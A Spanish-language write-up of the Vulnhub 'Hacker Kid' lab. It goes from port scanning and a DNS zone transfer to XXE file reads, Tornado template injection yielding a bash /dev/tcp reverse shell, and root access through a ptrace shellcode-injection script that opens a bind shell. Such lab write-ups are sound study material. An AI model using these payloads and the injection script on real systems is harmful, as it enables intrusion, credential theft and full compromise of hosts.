---
title: Hacker Kid - Vulnhub
layout: page
permalink: /writeups/vulnhub/hackerkid
date: 2025-04-04 11:00:00 -0000
categories: [Laboratorios]
tags: [Vulnhub]
description: >
  Write up en español para Hacker Kid - Vulnhub
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Contexto

Esta máquina es de estilo OSCP y está centrada en la enumeración con una explotación sencilla. El objetivo es obtener acceso como root. No se requiere adivinanza ni fuerza bruta intensiva, y se dan pistas adecuadas en cada paso para avanzar.

## Escaneo de puertos

```bash
nmap -sS -Pn -T4 -O 192.168.100.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-04 19:11 CEST
Nmap scan report for 192.168.100.95
Host is up (0.00027s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
9999/tcp open  abyss
MAC Address: BC:24:11:71:7C:A1 (Proxmox Server Solutions GmbH)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
```

## Puerto 80

Encontramos un portal web que parece indicar que hemos sido hackeados y nos incita a investigar más.

![alt text](/assets/img/posts/hacker-kid/image.png)

## Puerto 9999

Vemos un login para acceder a algún recurso de la máquina.

![alt text](/assets/img/posts/hacker-kid/image-1.png)

Esto parece interesante por lo que vamos a analizar las cabeceras HTTP para intentar encontrar alguna información de interés.

![alt text](/assets/img/posts/hacker-kid/image-2.png)

Tenemos cierta información que nos puede ser útil como la verión del framework que está utilizando `TornadoServer6.1` que es un framework web para Python. 

Esto nos da una pista clara: el backend está hecho en Python, y puede haber puntos vulnerables típicos de apps en Python, como inyecciones mal filtradas o fugas de información.

También vemos un campo _xsrf que se mantiene oculto en el formulario de login. Esto es normal en el framework Tornado pero lo tendremos en mente por si podemos predecir, reutilizar o manipularlo si no se valida correctamente.

## Puerto 53

El servidor parece tener configurado un servidor DNS que nos permite resolver nombres de dominio, o que puede indicar la existencia de un subdominio.

Aunque por ahora no parece ser de utilidad ya que no tenemos el dominio que usa (si es que lo tiene configurado).

## Exploración 

En el index de la web puerto 80 si probamos los elementos de la barra de navegación podemos encontrar algunas cosas interesantes.

Encontramos un comentario en el código HTML que indica utilizar el método `GET` en el parámetro `page_no`para tener visualización de las páginas.

![alt text](/assets/img/posts/hacker-kid/image-3.png)

Vamos a realizar entonces un pequño escaneo para ver cuales de las respuestas que nos devuelven son de interés según el id.

```bash
for i in {1..50}; do
  size=$(curl -s -o /dev/null -w "%{size_download}" "http://192.168.100.95/?page_no=$i")
  if [ "$size" -gt 100 ]; then
    echo "[+] page_no=$i -> Endpoint válido (size=$size)"
  else
    echo "[-] page_no=$i -> No válido"
  fi
done
```
Iremos variando el rango del id y nos fijaremos en el tamaño de la respuesta para ver posibles pistas.

```bash	
[+] page_no=18 -> Endpoint válido (size=3654)
[+] page_no=19 -> Endpoint válido (size=3654)
[+] page_no=20 -> Endpoint válido (size=3654)
[+] page_no=21 -> Endpoint válido (size=3849)
[+] page_no=22 -> Endpoint válido (size=3654)

```

En el rango indicado vemos que el id 21 tiene un tamaño de 3849 bytes, y el resto de los ids tienen un tamaño de 3654 bytes, lo que puede indicar que hay información extra.

![alt text](/assets/img/posts/hacker-kid/image-4.png)

Nos indica una pista para lo que antes dudábamos. Si tiene activo el servidor de DNS solo que ahora nos indica el dominio que utiliza.

## Transferencia de DNS

Primero debemos indicar en nuestra máquina la ip corresponde al dominio **blackhat.local**.

```bash
echo "192.168.100.95 hackers.blackhat.local blackhat.local" >> /etc/hosts
```

Con esto ahora averiguamos que el contenido del puerto 80 se corresponde con el subdominio **hackers.blackhat.local** y que el contenido en blackhat.local no es accesible.

Para averiguar los posibles subdominios que puede tener el servidor DNS primero podemos probar con una transferencia de DNS ya que si no está bien configurado nos devolverá todos los subdominios del servidor.

```bash
 dig axfr @192.168.100.95 blackhat.local


; <<>> DiG 9.20.7-1-Debian <<>> axfr @192.168.100.95 blackhat.local
; (1 server found)
;; global options: +cmd
blackhat.local.         10800   IN      SOA     blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600
blackhat.local.         10800   IN      NS      ns1.blackhat.local.
blackhat.local.         10800   IN      MX      10 mail.blackhat.local.
blackhat.local.         10800   IN      A       192.168.14.143
ftp.blackhat.local.     10800   IN      CNAME   blackhat.local.
hacker.blackhat.local.  10800   IN      CNAME   hacker.blackhat.local.blackhat.local.
mail.blackhat.local.    10800   IN      A       192.168.14.143
ns1.blackhat.local.     10800   IN      A       192.168.14.143
ns2.blackhat.local.     10800   IN      A       192.168.14.143
www.blackhat.local.     10800   IN      CNAME   blackhat.local.
blackhat.local.         10800   IN      SOA     blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600
;; Query time: 0 msec
;; SERVER: 192.168.100.95#53(192.168.100.95) (TCP)
;; WHEN: Fri Apr 04 20:41:50 CEST 2025
;; XFR size: 11 records (messages 1, bytes 353)
```

Tenemos numerosos subdominios por lo que para poder visitarlos vamos a tener que añadirlos a nuestro archivo `/etc/hosts`.

El único que parece útil es `hackerkid.blackhat.local`

![alt text](/assets/img/posts/hacker-kid/image-5.png)

## Inyección XXE

Intentando registrar un usuario, parece que siempre tenemos el mismo error sobre el campo `email`, indicando el valor el mismo y que no está disponible.

![alt text](/assets/img/posts/hacker-kid/image-6.png)

Si vemos las cabeceras de la petición y como se pasan estos datos al backend avergiremos que es un formulario XML.

![alt text](/assets/img/posts/hacker-kid/image-7.png)

[Info adicional sobre XXE](https://portswigger.net/web-security/xxe)

> La aplicación no implementa defensas particulares contra ataques XXE, por lo que puedes explotar la vulnerabilidad XXE para obtener el archivo `/etc/passwd` enviando el siguiente payload XXE:

 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```

 Este payload XXE define una entidad externa llamada `&xxe;` cuyo valor es el contenido del archivo `/etc/passwd`, y usa esa entidad dentro del valor `productId`. Esto provoca que la respuesta de la aplicación incluya el contenido del archivo:


**XXE (XML External Entity)** es una vulnerabilidad que ocurre cuando una aplicación:
- Acepta entradas en formato **XML**
- Y **procesa** ese XML con un parser que **permite entidades externas**

Esto permite al atacante hacer que el XML incluya archivos del sistema, realice peticiones a servidores internos, o incluso ejecute ataques más avanzados.

![alt text](/assets/img/posts/hacker-kid/image-8.png)

Podemos ver que el usuario 1000 corresponde a **saket** por lo que vamos a investigar por contenido correspondiente al mismo.

Para poder exfiltrar contenido a través de XXE en esta aplicación PHP vamos a necesitar crear un wrapper para evitar posibles errores con ciertos carácteres especiales, secuencias no válidas, etc.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc"> 
]>
```

![alt text](/assets/img/posts/hacker-kid/image-9.png)

Tras dwcodificar la salida obtenemos el archivo que queremos exfiltrar, bashrc.

![alt text](/assets/img/posts/hacker-kid/image-10.png)

Tenemos unas credenciales para la aplicación que está corriendo el framework python.

## Acceso en el panel puerto 9999

![alt text](/assets/img/posts/hacker-kid/image-11.png)

Parece que el usuario admin no es correcto pero probando con el usuario del sistema `saket`si nos da acceso.

![alt text](/assets/img/posts/hacker-kid/image-12.png)

Nos pregunta por nuestro nombre aunque no nos deja ninguna opción para introducirlo... Sabiendo que es PHP y que al inicio nos indicó el parámetro page_no podemos intentar pasar ahora un parámetro name para intentar decirle nuestro nombre.

![alt text](/assets/img/posts/hacker-kid/image-13.png)

Parece que funciona por lo que en este punto parece que estamos ante una posible inyección de plantillas SSTI.

## Inyección SSTI

Sabiendo que el framework es basado en python nos evitamos tener que averiguar el tipo de payload que vamos a necesitar.

[Información sobre SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)

![alt text](/assets/img/posts/hacker-kid/image-14.png)

![alt text](/assets/img/posts/hacker-kid/image-15.png)

Ahora que tenemos una inyección SSTI podemos realizar RCE para obtener una shell reversa.

## Shell reversa

```python
{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.100.210/4444 0>&1"')}}
```

Encodeamos el payload en URL antes de enviarlo a la aplicación.

![alt text](/assets/img/posts/hacker-kid/image-16.png)

![alt text](/assets/img/posts/hacker-kid/image-17.png)

Estabilizamos la shell y la hacemos interactiva.

```bash	
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
ENTER
export TERM=xterm
```

![alt text](/assets/img/posts/hacker-kid/image-18.png)

## Escalado privilegios

Intentamos `sudo -l` para ver si tenemos privilegios sobre algún binario pero la contraseña de `saket`de la aplicación python no parece valer en este caso.

Buscando binarios con permisos elevador interesantes tampoco encontramos gran cosa...

![alt text](/assets/img/posts/hacker-kid/image-19.png)

Otro comando útil para obtener las capacidades de los binarios es `/sbin/getcap -r / 2>/dev/null` que nos muestra las capacidades de los binarios de `/bin` y `/sbin`.

![alt text](/assets/img/posts/hacker-kid/image-20.png)

Esto significa que el binario de Python 2.7 tiene la capacidad especial CAP_SYS_PTRACE habilitada.

Esta capacidad permite que un proceso tracee (inspeccione/modifique) a otros procesos, incluso de otros usuarios, como lo haría gdb o strace.

  -  Leer la memoria de procesos ajenos

  -  Inyectar código

  -  Atachar a procesos de root

  -  Leer datos sensibles como contraseñas, variables, o incluso binarios en ejecución

Para aprovechar esto vamos a listar los procesos del sistema que estén siendo ejecutados por el usuario `root`.

```bash
ps -eaf | grep root
```

![alt text](/assets/img/posts/hacker-kid/image-22.png)

Vamos a encontrar el proceso que ejecuta apache2.

Basandonos en el contenido del siguiente [post](https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc)

Crearemos un script en python que nos permita inyectar código en el proceso de root y cree uno nuevo que sirva una shell root sin contraseña.

En /tmp creamos el script:

```python
# -*- coding: utf-8 -*-
import ctypes
import sys
import struct
import os

# Constants from <sys/ptrace.h>
PTRACE_POKETEXT = 4
PTRACE_GETREGS  = 12
PTRACE_SETREGS  = 13
PTRACE_ATTACH   = 16
PTRACE_DETACH   = 17

# x86_64 register structure from <sys/user.h>
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

#
# x86_64 BIND SHELL shellcode listening on port 9000 (0x2328, network order 0x23 0x28)
# Creates a socket, bind(0.0.0.0:9000), listen, accept, dup2, exec /bin/sh
#
shellcode = (
    "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6"      # zero out regs, set rsi=0, rdx=0, inc rsi=1? ...
    "\x6a\x29\x58"                                      # push 0x29; pop rax -> sys_socket
    "\x6a\x02\x5f"                                      # push 2; pop rdi -> AF_INET
    "\x0f\x05"                                          # syscall -> socket(AF_INET, SOCK_STREAM, 0)
    "\x48\x97"                                          # xchg rdi, rax (store sockfd in rdi)
    "\x6a\x02"                                          # push 2
    "\x66\xc7\x44\x24\x02\x23\x28"                      # mov word [rsp+2], 0x2328 (9000 in BE)
    "\x54"                                              # push rsp
    "\x5e"                                              # pop rsi => points to sockaddr_in on stack
    "\x52"                                              # push rdx => zero -> sin_zero
    "\x6a\x31\x58"                                      # push 0x31; pop rax -> sys_bind
    "\x6a\x10\x5a"                                      # push 16; pop rdx -> sizeof(sockaddr_in)
    "\x0f\x05"                                          # syscall -> bind(sockfd, sockaddr_in, 16)
    "\x5e"                                              # pop rsi (restore something)
    "\x6a\x32\x58"                                      # push 0x32; pop rax -> sys_listen
    "\x0f\x05"                                          # listen(sockfd, backlog=0)
    "\x6a\x2b\x58"                                      # push 0x2b; pop rax -> sys_accept
    "\x0f\x05"                                          # accept(sockfd, NULL, NULL)
    "\x48\x97"                                          # xchg rdi, rax (new client socket in rdi)
    "\x6a\x03\x5e"                                      # push 3; pop rsi
    "\xff\xce"                                          # dec esi
    "\xb0\x21"                                          # mov al, 0x21 (syscall = sys_dup2)
    "\x0f\x05"                                          # dup2(rdi, rsi)
    "\x75\xf8"                                          # jnz -> repeat for 0,1,2
    "\xf7\xe6"                                          # mul esi (clear?)
    "\x52"                                              # push rdx
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"          # mov rbx, "//bin/sh"
    "\x53"                                              # push rbx
    "\x48\x8d\x3c\x24"                                  # lea rdi, [rsp]
    "\xb0\x3b"                                          # mov al, 0x3b -> execve
    "\x0f\x05"                                          # syscall
)

def inject_data(pid, src, dst_addr, length):
    """
    Write `length` bytes from `src` into the target process `pid` at address `dst_addr`.
    Using 4-byte chunks (like the original C code example).
    """
    for offset in range(0, length, 4):
        chunk = src[offset:offset+4]
        chunk = chunk.ljust(4, "\x00")  # ensure 4 bytes
        data = struct.unpack("<I", chunk)[0]
        if libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(dst_addr + offset), data) < 0:
            raise OSError("ptrace(POKETEXT) failed at offset {}".format(offset))

def main():
    if len(sys.argv) != 2:
        print("Usage: python2 mem_inject_bind9000.py <PID>")
        sys.exit(1)

    pid = int(sys.argv[1])
    print("[*] Target PID: {}".format(pid))

    # Attach
    if libc.ptrace(PTRACE_ATTACH, pid, None, None) < 0:
        raise OSError("ptrace(ATTACH) failed")
    os.waitpid(pid, 0)
    print("[*] Attached. Process is stopped now.")

    # Get registers
    regs = user_regs_struct()
    if libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(regs)) < 0:
        raise OSError("ptrace(GETREGS) failed")
    print("[*] Current RIP: 0x{:x}".format(regs.rip))

    # Inject shellcode at current RIP
    inject_data(pid, shellcode, regs.rip, len(shellcode))
    print("[*] Shellcode injected at RIP 0x{:x}".format(regs.rip))

    # Bump RIP a little (like the C code does: +2)
    regs.rip += 2
    print("[*] Adjusted RIP to 0x{:x}".format(regs.rip))

    # Set new registers
    if libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(regs)) < 0:
        raise OSError("ptrace(SETREGS) failed")

    # Detach and let the process run
    if libc.ptrace(PTRACE_DETACH, pid, None, None) < 0:
        raise OSError("ptrace(DETACH) failed")

    print("[*] Detached. The target process should now be running a bind shell on port 9000.")
    print("[*] Try: nc <victim-ip> 9000")

if __name__ == "__main__":
    main()
```

![alt text](/assets/img/posts/hacker-kid/image-21.png)

![alt text](/assets/img/posts/hacker-kid/image-23.png)